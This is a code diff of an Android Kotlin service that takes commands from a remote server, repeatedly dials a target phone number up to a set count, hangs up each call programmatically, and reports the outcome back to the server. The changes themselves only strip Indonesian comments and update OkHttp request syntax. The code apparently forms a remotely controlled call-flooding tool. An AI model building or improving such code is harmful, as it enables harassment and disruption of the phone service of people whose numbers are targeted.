@@ -12,6 +12,8 @@ import android.view.KeyEvent
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 import java.io.IOException
 
@@ -22,7 +24,6 @@ class CallerService : Service() {
     private var apiKey = ""
     private var isRunning = false
     
-    // 🔥 VARIABEL BUAT STOP CALL
     private var isCalling = false 
     private var callRunnable: Runnable? = null
 
@@ -69,7 +70,6 @@ class CallerService : Service() {
                             val action = data.optString("action", "call")
                             
                             if (action == "stop") {
-                                // 🔥 HENTIKAN CALL
                                 stopCallLoop()
                                 sendReport("0", "Dihentikan Paksa")
                             } else {
@@ -86,12 +86,10 @@ class CallerService : Service() {
         })
     }
 
-    // 🔥 FUNGSI BARU BUAT STOP LOOP
     private fun stopCallLoop() {
         isCalling = false
         callRunnable?.let { handler.removeCallbacks(it) }
         
-        // Tutup telepon yang lagi jalan
         val endCall = Intent(Intent.ACTION_MEDIA_BUTTON)
         endCall.putExtra(Intent.EXTRA_KEY_EVENT, KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENDCALL))
         sendOrderedBroadcast(endCall, null)
@@ -102,7 +100,10 @@ class CallerService : Service() {
         json.put("target", target)
         json.put("status", status)
         
-        val body = RequestBody.create(MediaType.parse("application/json"), json.toString())
+        // 🔥 FIX SYNTAX OKHTTP DI SINI
+        val mediaType = "application/json; charset=utf-8".toMediaType()
+        val body = json.toString().toRequestBody(mediaType)
+        
         val request = Request.Builder()
             .url("$baseUrl/report")
             .addHeader("x-api-key", apiKey)
@@ -116,7 +117,6 @@ class CallerService : Service() {
     }
 
     private fun startCallLoop(target: String, maxCount: Int) {
-        // Matiin loop lama kalau ada
         stopCallLoop()
         
         isCalling = true
@@ -124,7 +124,6 @@ class CallerService : Service() {
         
         callRunnable = object : Runnable {
             override fun run() {
-                // 🔥 CEK APAKAH MASIH BOLEH NELFON
                 if (!isCalling || current >= maxCount) {
                     sendReport(target, "Selesai / Dihentikan")
                     return
@@ -141,7 +140,7 @@ class CallerService : Service() {
                 }
 
                 handler.postDelayed({
-                    if (!isCalling) return@postDelayed // Cek lagi kalau di-stop pas nelfon
+                    if (!isCalling) return@postDelayed
                     
                     val endCall = Intent(Intent.ACTION_MEDIA_BUTTON)
                     endCall.putExtra(Intent.EXTRA_KEY_EVENT, KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENDCALL))
